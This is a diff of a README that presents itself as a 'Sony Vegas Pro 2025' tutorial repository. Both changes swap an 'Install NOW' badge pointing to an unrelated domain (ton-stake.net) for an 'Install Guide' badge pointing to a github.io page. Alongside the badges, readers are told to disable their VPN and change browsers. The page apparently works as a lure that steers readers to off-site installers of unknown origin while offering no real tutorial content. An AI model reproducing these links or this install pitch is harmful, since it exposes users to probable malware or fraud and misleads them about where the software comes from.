@@ -5,7 +5,9 @@
 
 **Description**: Unleash your video editing potential with **Sony Vegas Pro 2025**, a premium tool packed with AI innovations! This repository offers tutorials, resources, and tips to explore Vegas Pro’s new features like Auto Reframe and Motion Tracking for stunning video content. Start with accessible editing solutions and join our thriving community of creators in 2025!  
 
-[![Install Sony Vegas Pro 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://videocraftmasterhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -30,7 +32,9 @@ Elevate your video skills with these straightforward steps to get Sony Vegas Pro
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother process.  
 
-[![Install Sony Vegas Pro 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://videocraftmasterhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
